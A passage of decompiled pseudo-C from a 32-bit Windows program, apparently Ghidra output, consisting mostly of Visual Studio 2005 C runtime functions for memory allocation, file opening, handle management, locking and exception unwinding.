    QueryPerformanceCounter(&local_14);
    DAT_00422044 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_00422044 == 0xbb40e64e) {
      DAT_00422044 = 0xbb40e64f;
    }
    else if ((DAT_00422044 & 0xffff0000) == 0) {
      DAT_00422044 = DAT_00422044 | DAT_00422044 << 0x10;
    }
    DAT_00422048 = ~DAT_00422044;
  }
  else {
    DAT_00422048 = ~DAT_00422044;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004139fa(void)

{
  _DAT_004257dc = 0;
  return;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2005 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_00424474 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00424474 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2005 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  int *piVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    piVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (piVar1 != (int *)0x0) {
      return piVar1;
    }
    if (DAT_00424474 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00424474 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2005 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_00424474 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00424474 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  __tsopen_nolock
// 
// Library: Visual Studio 2005 Release

int __cdecl
__tsopen_nolock(undefined4 *param_1,LPCWSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  uint *in_EAX;
  errno_t eVar2;
  int iVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  HANDLE hFile;
  long lVar7;
  int iVar8;
  byte bVar9;
  int unaff_EDI;
  DWORD DVar10;
  bool bVar11;
  longlong lVar12;
  _SECURITY_ATTRIBUTES local_30;
  undefined4 local_20;
  int local_1c;
  uint local_18;
  DWORD local_14;
  uint local_10;
  uint local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar11 = (param_3 & 0x80) == 0;
  local_18 = 0;
  local_1c = 0;
  local_6 = 0;
  local_30.nLength = 0xc;
  local_30.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar11) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_30.bInheritHandle = (BOOL)bVar11;
  eVar2 = __get_fmode((int *)&local_18);
  if (eVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  iVar3 = __get_osplatform(&local_1c);
  if (iVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_18 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_10 = 0x80000000;
  }
  else if (uVar4 == 1) {
    local_10 = 0x40000000;
  }
  else {
    if (uVar4 != 2) goto LAB_00413c19;
    local_10 = 0xc0000000;
  }
  if (param_4 == 0x10) {
    local_c = 0;
  }
  else if (param_4 == 0x20) {
    local_c = 1;
  }
  else if (param_4 == 0x30) {
    local_c = 2;
  }
  else if (param_4 == 0x40) {
    local_c = 3;
  }
  else {
    if (param_4 != 0x80) goto LAB_00413c19;
    local_c = (uint)(local_10 == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_14 = 3;
    }
    else if (uVar4 == 0x100) {
      local_14 = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_00413d56;
      if (uVar4 != 0x300) goto LAB_00413c19;
      local_14 = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_00413d56:
        local_14 = 5;
        goto LAB_00413d01;
      }
      if (uVar4 != 0x700) {
LAB_00413c19:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return 0x16;
      }
    }
    local_14 = 1;
  }
LAB_00413d01:
  DVar10 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_00423eb8 & param_5))) {
    DVar10 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_10 = local_10 | 0x10000;
    DVar10 = DVar10 | 0x4000000;
    if (local_1c == 2) {
      local_c = local_c | 4;
    }
  }
  if ((param_3 & 0x1000) != 0) {
    DVar10 = DVar10 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      DVar10 = DVar10 | 0x10000000;
    }
  }
  else {
    DVar10 = DVar10 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    goto LAB_00413ddd;
  }
  *param_1 = 1;
  hFile = CreateFileW(param_2,local_10,local_c,&local_30,local_14,DVar10,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    pbVar1 = (byte *)((&DAT_00425820)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x28);
    *pbVar1 = *pbVar1 & 0xfe;
  }
  else {
    DVar10 = GetFileType(hFile);
    if (DVar10 != 0) {
      if (DVar10 == 2) {
        local_5 = local_5 | 0x40;
      }
      else if (DVar10 == 3) {
        local_5 = local_5 | 8;
      }
      __set_osfhnd(*in_EAX,(intptr_t)hFile);
      bVar9 = local_5 | 1;
      *(byte *)((&DAT_00425820)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x28) = bVar9;
      pbVar1 = (byte *)((&DAT_00425820)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x28);
      *pbVar1 = *pbVar1 & 0x80;
      local_7 = local_5 & 0x48;
      if (local_7 == 0) {
        if ((local_5 & 0x80) == 0) goto LAB_0041413a;
        if ((param_3 & 2) == 0) goto LAB_00413f00;
        local_5 = bVar9;
        local_c = __lseek_nolock(*in_EAX,-1,2);
        if (local_c == 0xffffffff) {
          puVar5 = ___doserrno();
          bVar9 = local_5;
          if (*puVar5 == 0x83) goto LAB_00413f00;
        }
        else {
          local_20 = 0;
          iVar3 = __read_nolock(*in_EAX,&local_20,1);
          if ((((iVar3 != 0) || ((short)local_20 != 0x1a)) ||
              (iVar3 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,(int)local_c >> 0x1f)),
              iVar3 != -1)) && (lVar7 = __lseek_nolock(*in_EAX,0,0), bVar9 = local_5, lVar7 != -1))
          goto LAB_00413f00;
        }
      }
      else {
LAB_00413f00:
        local_5 = bVar9;
        if ((local_5 & 0x80) == 0) goto LAB_0041413a;
        if ((param_3 & 0x74000) == 0) {
          if ((local_18 & 0x74000) == 0) {
            param_3 = param_3 | 0x4000;
          }
          else {
            param_3 = param_3 | local_18 & 0x74000;
          }
        }
        uVar4 = param_3 & 0x74000;
        if (uVar4 == 0x4000) {
          local_6 = 0;
        }
        else if ((uVar4 == 0x10000) || (uVar4 == 0x14000)) {
          if ((param_3 & 0x301) == 0x301) goto LAB_00413f6f;
        }
        else if ((uVar4 == 0x20000) || (uVar4 == 0x24000)) {
LAB_00413f6f:
          local_6 = 2;
        }
        else if ((uVar4 == 0x40000) || (uVar4 == 0x44000)) {
          local_6 = 1;
        }
        if (((param_3 & 0x70000) == 0) || (local_c = 0, (local_5 & 0x40) != 0)) goto LAB_0041413a;
        uVar4 = local_10 & 0xc0000000;
        if (uVar4 == 0x40000000) {
          if (local_14 == 0) goto LAB_0041413a;
          if (2 < local_14) {
            if (local_14 < 5) {
              lVar12 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
              if (lVar12 == 0) goto LAB_00413fd4;
              lVar12 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
              uVar4 = (uint)lVar12 & (uint)((ulonglong)lVar12 >> 0x20);
              goto LAB_004140a0;
            }
LAB_00413fcb:
            if (local_14 != 5) goto LAB_0041413a;
          }
LAB_00413fd4:
          iVar3 = 0;
          if (local_6 == 1) {
            local_c = 0xbfbbef;
            local_14 = 3;
          }
          else {
            if (local_6 != 2) goto LAB_0041413a;
            local_c = 0xfeff;
            local_14 = 2;
          }
          do {
            iVar8 = __write(*in_EAX,(void *)((int)&local_c + iVar3),local_14 - iVar3);
            if (iVar8 == -1) goto LAB_00413eb2;
            iVar3 = iVar3 + iVar8;
          } while (iVar3 < (int)local_14);
LAB_0041413a:
          pbVar1 = (byte *)((&DAT_00425820)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x28);
          *pbVar1 = *pbVar1 ^ (*pbVar1 ^ local_6) & 0x7f;
          pbVar1 = (byte *)((&DAT_00425820)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x28);
          *pbVar1 = (char)(param_3 >> 0x10) << 7 | *pbVar1 & 0x7f;
          if ((local_7 == 0) && ((param_3 & 8) != 0)) {
            pbVar1 = (byte *)((&DAT_00425820)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x28);
            *pbVar1 = *pbVar1 | 0x20;
          }
          return 0;
        }
        if (uVar4 != 0x80000000) {
          if ((uVar4 != 0xc0000000) || (local_14 == 0)) goto LAB_0041413a;
          if (2 < local_14) {
            if (4 < local_14) goto LAB_00413fcb;
            lVar12 = __lseeki64_nolock(*in_EAX,0x200000000,unaff_EDI);
            if (lVar12 != 0) {
              lVar12 = __lseeki64_nolock(*in_EAX,0,unaff_EDI);
              if (lVar12 == -1) goto LAB_00413eb2;
              goto LAB_00414025;
            }
          }
          goto LAB_00413fd4;
        }
LAB_00414025:
        iVar3 = __read_nolock(*in_EAX,&local_c,3);
        if (iVar3 == -1) goto LAB_00413eb2;
        if (iVar3 == 2) {
LAB_004140ae:
          if ((local_c & 0xffff) == 0xfffe) {
            __close_nolock(*in_EAX);
            piVar6 = __errno();
            *piVar6 = 0x16;
            return 0x16;
          }
          if ((local_c & 0xffff) == 0xfeff) {
            lVar7 = __lseek_nolock(*in_EAX,2,0);
            if (lVar7 != -1) {
              local_6 = 2;
              goto LAB_0041413a;
            }
            goto LAB_00413eb2;
          }
        }
        else if (iVar3 == 3) {
          if (local_c == 0xbfbbef) {
            local_6 = 1;
            goto LAB_0041413a;
          }
          goto LAB_004140ae;
        }
        uVar4 = __lseek_nolock(*in_EAX,0,0);
LAB_004140a0:
        if (uVar4 != 0xffffffff) goto LAB_0041413a;
      }
LAB_00413eb2:
      __close_nolock(*in_EAX);
      goto LAB_00413ddd;
    }
    pbVar1 = (byte *)((&DAT_00425820)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x28);
    *pbVar1 = *pbVar1 & 0xfe;
    CloseHandle(hFile);
  }
  DVar10 = GetLastError();
  __dosmaperr(DVar10);
LAB_00413ddd:
  piVar6 = __errno();
  return *piVar6;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __wsopen_helper
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl
__wsopen_helper(wchar_t *_Filename,int _OFlag,int _ShFlag,int _PMode,int *_PFileHandle,int _BSecure)

{
  int *piVar1;
  errno_t eVar2;
  undefined4 local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420608;
  uStack_c = 0x4141bf;
  local_20[0] = 0;
  if (((_PFileHandle == (int *)0x0) || (*_PFileHandle = -1, _Filename == (wchar_t *)0x0)) ||
     ((_BSecure != 0 && ((_PMode & 0xfffffe7fU) != 0)))) {
    piVar1 = __errno();
    eVar2 = 0x16;
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    local_8 = (undefined *)0x0;
    eVar2 = __tsopen_nolock(local_20,_Filename,_OFlag,_ShFlag,(byte)_PMode);
    local_8 = (undefined *)0xfffffffe;
    FUN_00414251();
    if (eVar2 != 0) {
      *_PFileHandle = -1;
    }
  }
  return eVar2;
}



void FUN_00414251(void)

{
  byte *pbVar1;
  int unaff_EBP;
  int unaff_ESI;
  uint *unaff_EDI;
  
  if (*(int *)(unaff_EBP + -0x1c) != unaff_ESI) {
    if (*(int *)(unaff_EBP + -0x20) != unaff_ESI) {
      pbVar1 = (byte *)((&DAT_00425820)[(int)*unaff_EDI >> 5] + 4 + (*unaff_EDI & 0x1f) * 0x28);
      *pbVar1 = *pbVar1 & 0xfe;
    }
    __unlock_fhandle(*unaff_EDI);
  }
  return;
}



// Library Function - Single Match
//  __wsopen_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl
__wsopen_s(int *_FileHandle,wchar_t *_Filename,int _OpenFlag,int _ShareFlag,int _PermissionFlag)

{
  errno_t eVar1;
  
  eVar1 = __wsopen_helper(_Filename,_OpenFlag,_ShareFlag,_PermissionFlag,_FileHandle,1);
  return eVar1;
}



void __cdecl FUN_0041429d(undefined4 param_1)

{
  DAT_0042447c = param_1;
  return;
}



// Library Function - Single Match
//  ___crtInitCritSecNoSpinCount@8
// 
// Library: Visual Studio 2005 Release

undefined4 ___crtInitCritSecNoSpinCount_8(LPCRITICAL_SECTION param_1)

{
  InitializeCriticalSection(param_1);
  return 1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___crtInitCritSecAndSpinCount
// 
// Library: Visual Studio 2005 Release

int __cdecl ___crtInitCritSecAndSpinCount(undefined4 param_1,undefined4 param_2)

{
  code *pcVar1;
  int iVar2;
  HMODULE hModule;
  int local_20 [5];
  undefined4 uStack_c;
  undefined *local_8;
  
  local_8 = &DAT_00420628;
  uStack_c = 0x4142c3;
  local_20[0] = 0;
  pcVar1 = (code *)__decode_pointer(DAT_0042447c);
  if (pcVar1 != (FARPROC)0x0) goto LAB_0041432d;
  iVar2 = __get_osplatform(local_20);
  if (iVar2 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (local_20[0] == 1) {
LAB_0041431c:
    pcVar1 = ___crtInitCritSecNoSpinCount_8;
  }
  else {
    hModule = GetModuleHandleA(s_kernel32_dll_0041cb10);
    if (hModule == (HMODULE)0x0) goto LAB_0041431c;
    pcVar1 = GetProcAddress(hModule,s_InitializeCriticalSectionAndSpin_0041cae8);
    if (pcVar1 == (FARPROC)0x0) goto LAB_0041431c;
  }
  DAT_0042447c = __encode_pointer((int)pcVar1);
LAB_0041432d:
  local_8 = (undefined *)0x0;
  iVar2 = (*pcVar1)(param_1,param_2);
  return iVar2;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Library: Visual Studio 2005 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2005 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2005 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  BOOL BVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  PBYTE pImageBase;
  
  BVar1 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if ((BVar1 != 0) &&
     (p_Var2 = __FindPESection(pImageBase,(int)pTarget - (int)pImageBase),
     p_Var2 != (PIMAGE_SECTION_HEADER)0x0)) {
    return ~(p_Var2->Characteristics >> 0x1f) & 1;
  }
  return 0;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x414478,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  void *local_20;
  undefined *puStack_1c;
  undefined4 local_18;
  int iStack_14;
  
  iStack_14 = param_1;
  puStack_1c = &LAB_00414480;
  local_20 = ExceptionList;
  ExceptionList = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_00414594();
    }
  }
  ExceptionList = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00422e30 = param_1;
  DAT_00422e2c = in_EAX;
  DAT_00422e34 = unaff_EBP;
  return in_EAX;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2017 Release, Visual Studio 2019 Debug, Visual
// Studio 2019 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_00422e30 = param_1;
  DAT_00422e2c = in_EAX;
  DAT_00422e34 = unaff_EBP;
  return;
}



void FUN_00414594(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2005 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00425818)) {
    iVar3 = (param_1 & 0x1fU) * 0x28;
    if (*(int *)(iVar3 + (&DAT_00425820)[param_1 >> 5]) == -1) {
      if (DAT_00422040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_004145f1;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_004145f1:
      *(intptr_t *)(iVar3 + (&DAT_00425820)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2005 Release

int __cdecl __free_osfhnd(int param_1)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < DAT_00425818)) {
    iVar3 = (param_1 & 0x1fU) * 0x28;
    piVar1 = (int *)((&DAT_00425820)[param_1 >> 5] + iVar3);
    if (((*(byte *)(piVar1 + 1) & 1) != 0) && (*piVar1 != -1)) {
      if (DAT_00422040 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else if (param_1 == 1) {
          nStdHandle = 0xfffffff5;
        }
        else {
          if (param_1 != 2) goto LAB_00414672;
          nStdHandle = 0xfffffff4;
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_00414672:
      *(undefined4 *)(iVar3 + (&DAT_00425820)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2005 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  intptr_t *piVar3;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if (((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425818)) &&
     (piVar3 = (intptr_t *)((_FileHandle & 0x1fU) * 0x28 + (&DAT_00425820)[_FileHandle >> 5]),
     (*(byte *)(piVar3 + 1) & 1) != 0)) {
    return *piVar3;
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2005 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  int iVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x28 + (&DAT_00425820)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      iVar1 = ___crtInitCritSecAndSpinCount(iVar2 + 0xc,4000);
      local_20 = (uint)(iVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_0041479d();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_00425820)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x28));
  }
  return local_20;
}



void FUN_0041479d(void)

{
  FUN_0040e37b(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2005 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_00425820)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x28));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __alloc_osfhnd
// 
// Library: Visual Studio 2005 Release

int __cdecl __alloc_osfhnd(void)

{
  bool bVar1;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  int local_20;
  
  local_20 = -1;
  iVar4 = 0;
  bVar1 = false;
  iVar2 = __mtinitlocknum(0xb);
  if (iVar2 == 0) {
    local_20 = -1;
  }
  else {
    __lock(0xb);
    for (; iVar4 < 0x40; iVar4 = iVar4 + 1) {
      puVar3 = (undefined4 *)(&DAT_00425820)[iVar4];
      if (puVar3 == (undefined4 *)0x0) {
        puVar3 = (undefined4 *)__calloc_crt(0x20,0x28);
        if (puVar3 != (undefined4 *)0x0) {
          (&DAT_00425820)[iVar4] = puVar3;
          DAT_00425818 = DAT_00425818 + 0x20;
          for (; puVar3 < (undefined4 *)((&DAT_00425820)[iVar4] + 0x500); puVar3 = puVar3 + 10) {
            *(undefined *)(puVar3 + 1) = 0;
            *puVar3 = 0xffffffff;
            *(undefined *)((int)puVar3 + 5) = 10;
            puVar3[2] = 0;
          }
          local_20 = iVar4 << 5;
          *(undefined *)((&DAT_00425820)[local_20 >> 5] + 4) = 1;
          iVar2 = ___lock_fhandle(local_20);
          if (iVar2 == 0) {
            local_20 = -1;
          }
        }
        break;
      }
      for (; puVar3 < (undefined4 *)((&DAT_00425820)[iVar4] + 0x500); puVar3 = puVar3 + 10) {
        if ((*(byte *)(puVar3 + 1) & 1) == 0) {
          if (puVar3[2] == 0) {
            __lock(10);
            if (puVar3[2] == 0) {
              iVar2 = ___crtInitCritSecAndSpinCount(puVar3 + 3,4000);
              if (iVar2 == 0) {
                bVar1 = true;
              }
              else {
                puVar3[2] = puVar3[2] + 1;
              }
            }
            FUN_0041489b();
          }
          if (!bVar1) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar3 + 3));
            if ((*(byte *)(puVar3 + 1) & 1) == 0) {
              *(undefined *)(puVar3 + 1) = 1;
              *puVar3 = 0xffffffff;
              local_20 = ((int)puVar3 - (&DAT_00425820)[iVar4]) / 0x28 + iVar4 * 0x20;
              break;
            }
            LeaveCriticalSection((LPCRITICAL_SECTION)(puVar3 + 3));
          }
        }
      }
      if (local_20 != -1) break;
    }
    FUN_0041495e();
  }
  return local_20;
}



void FUN_0041489b(void)

{
  FUN_0040e37b(10);
  return;
}



void FUN_0041495e(void)

{
  FUN_0040e37b(0xb);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __commit
// 
// Library: Visual Studio 2005 Release

int __cdecl __commit(int _FileHandle)

{
  int *piVar1;
  HANDLE hFile;
  BOOL BVar2;
  ulong *puVar3;
  int iVar4;
  DWORD local_20;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00425818)) {
      iVar4 = (_FileHandle & 0x1fU) * 0x28;
      if ((*(byte *)(iVar4 + 4 + (&DAT_00425820)[_FileHandle >> 5]) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)(iVar4 + 4 + (&DAT_00425820)[_FileHandle >> 5]) & 1) != 0) {
          hFile = (HANDLE)__get_osfhandle(_FileHandle);
          BVar2 = FlushFileBuffers(hFile);
          if (BVar2 == 0) {
            local_20 = GetLastError();
          }
          else {
            local_20 = 0;
          }
          if (local_20 == 0) goto LAB_00414a29;
          puVar3 = ___doserrno();
          *puVar3 = local_20;
        }
        piVar1 = __errno();
        *piVar1 = 9;
        local_20 = 0xffffffff;
LAB_00414a29:
        FUN_00414a3e();
        return local_20;
      }
    }
    piVar1 = __errno();
    *piVar1 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_00414a3e(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2005 Release

void __initp_misc_cfltcvt_tab(void)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  uVar3 = 0;
  do {
    piVar1 = (int *)((int)&DAT_00422e38 + uVar3);
    iVar2 = __encode_pointer(*piVar1);
    uVar3 = uVar3 + 4;
    *piVar1 = iVar2;
  } while (uVar3 < 0x28);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
